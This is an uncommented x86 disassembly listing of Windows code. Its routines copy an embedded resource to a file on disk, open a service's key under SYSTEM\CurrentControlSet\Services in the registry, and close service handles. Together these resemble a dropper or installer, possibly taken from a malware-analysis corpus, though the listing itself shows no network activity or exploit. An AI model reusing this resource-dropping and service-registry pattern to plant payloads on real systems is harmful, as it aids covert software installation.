mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn
mov     ebx, [ebp+var_330]
mov     esi, [ebp+var_32c]
test    ebx, ebx
jz      short loc_402303
push    ebx
call    ds:closeservicehandle
test    esi, esi
jz      short loc_40230e
push    esi
call    ds:closeservicehandle
mov     eax, [ebp+phkresult]
test    eax, eax
jz      short loc_40231f
push    eax
call    ds:regclosekey
retn
sub     esp, 108h
push    ebx
push    esi
push    edi
mov     ecx, 40h
xor     eax, eax
lea     edi, [esp+114h+var_103]
mov     [esp+114h+subkey], 0
lea     edx, [esp+114h+subkey]
rep stosd
stosw
stosb
mov     edi, offset asystemcurrentc_0
or      ecx, 0ffffffffh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+114h+subkey]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset servicename
or      ecx, 0ffffffffh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0ffffffffh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     eax, [esp+114h+phkresult]
and     ecx, 3
push    eax
rep movsb
push    0f003fh
lea     ecx, [esp+11ch+subkey]
push    0
push    ecx
push    80000002h
call    ds:regopenkeyexa
neg     eax
sbb     eax, eax
pop     edi
pop     esi
inc     eax
pop     ebx
add     esp, 108h
retn
push    0ffffffffh
push    offset seh_4023c0
mov     eax, large fs:0
push    eax
mov     large fs:0, esp
push    ecx
push    esi
mov     eax, [esp+14h+lpfilename]
push    0
push    0
push    2
push    0
push    0
push    40000000h
push    eax
call    ds:createfilea
mov     esi, eax
test    esi, esi
jz      short loc_402439
mov     edx, [esp+14h+nnumberofbytestowrite]
mov     eax, [esp+14h+lpbuffer]
lea     ecx, [esp+14h+numberofbyteswritten]
push    0
push    ecx
push    edx
push    eax
push    esi
call    ds:writefile
push    esi
call    ds:closehandle
lea     ecx, [esp+14h+lpfilename]
mov     [esp+14h+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
mov     al, 1
pop     esi
mov     ecx, [esp+10h+var_c]
mov     large fs:0, ecx
add     esp, 10h
retn
lea     ecx, [esp+14h+lpfilename]
mov     [esp+14h+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
mov     ecx, [esp+14h+var_c]
xor     al, al
pop     esi
mov     large fs:0, ecx
add     esp, 10h
retn
mov     eax, large fs:0
push    0ffffffffh
push    offset seh_402460
push    eax
mov     large fs:0, esp
push    ebx
push    ebp
push    esi
push    edi
mov     ecx, [esp+1ch+arg_4]
mov     eax, [esp+1ch+lptype]
and     ecx, 0ffffh
push    eax
push    ecx
push    0
mov     [esp+28h+var_4], 1
call    ds:findresourcea
mov     esi, eax
test    esi, esi
jz      short loc_402509
push    esi
push    0
call    ds:sizeofresource
push    esi
push    0
mov     ebx, eax
call    ds:loadresource
mov     esi, eax
test    esi, esi
jz      short loc_402509
push    ebx
push    40h
call    ds:globalalloc
mov     ebp, eax
test    ebp, ebp
jz      short loc_402509
push    esi
call    ds:lockresource
mov     ecx, ebx
mov     esi, eax
mov     edx, ecx
mov     edi, ebp
shr     ecx, 2
rep movsd
mov     ecx, edx
push    ebx
and     ecx, 3
push    ebp
rep movsb
push    ecx
lea     eax, [esp+28h+arg_0]
mov     ecx, esp
mov     [esp+28h+arg_4], esp
push    eax
call    ??0cstring@@qae@abv0@@z
call    sub_4023c0
add     esp, 0ch
test    al, al
push    ebp
jnz     short loc_40253d
call    ds:globalfree
lea     ecx, [esp+1ch+arg_0]
mov     byte ptr [esp+1ch+var_4], 0
call    ??1cstring@@qae@xz
lea     ecx, [esp+1ch+lptype]
mov     [esp+1ch+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
xor     al, al
mov     ecx, [esp+1ch+var_c]
mov     large fs:0, ecx
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 0ch
retn
call    ds:globalfree
lea     ecx, [esp+1ch+arg_0]
mov     byte ptr [esp+1ch+var_4], 0
call    ??1cstring@@qae@xz
lea     ecx, [esp+1ch+lptype]
mov     [esp+1ch+var_4], 0ffffffffh
call    ??1cstring@@qae@xz
mov     ecx, [esp+1ch+var_c]
pop     edi
pop     esi
pop     ebp
mov     al, 1
mov     large fs:0, ecx
pop     ebx
add     esp, 0ch
retn
call    sub_402590
jmp     loc_4025a0
mov     ecx, 4044f9h
jmp     ds:??0init@ios_base@std@@qae@xz
push    offset sub_4025b0
call    _atexit
pop     ecx
retn
mov     ecx, 4044f9h
jmp     ds:??1init@ios_base@std@@qae@xz
call    sub_4025d0
jmp     loc_4025e0
mov     ecx, 4044f8h
jmp     ds:??0_winit@std@@qae@xz
push    offset sub_4025f0
call    _atexit
pop     ecx
retn
mov     ecx, 4044f8h
jmp     ds:??1_winit@std@@qae@xz
xor     eax, eax
retn
lea     ecx, [ebp-98h]
jmp     ??1cstring@@qae@xz
lea     ecx, [ebp-90h]
jmp     ??1cstring@@qae@xz
mov     eax, offset stru_4031a8
jmp     __cxxframehandler
mov     ecx, [ebp-218h]
jmp     ??1cstring@@qae@xz
lea     ecx, [ebp-220h]
jmp     ??1cstring@@qae@xz
mov     eax, offset stru_4031d8
jmp     __cxxframehandler
mov     ecx, [ebp-218h]
jmp     ??1cstring@@qae@xz
lea     ecx, [ebp-220h]
jmp     ??1cstring@@qae@xz
mov     eax, offset stru_403208
jmp     __cxxframehandler
lea     ecx, [ebp+4]
jmp     ??1cstring@@qae@xz
mov     eax, offset stru_403238
jmp     __cxxframehandler
lea     ecx, [ebp+0ch]
jmp     ??1cstring@@qae@xz
lea     ecx, [ebp+4]
jmp     ??1cstring@@qae@xz
mov     eax, offset stru_403260
jmp     __cxxframehandler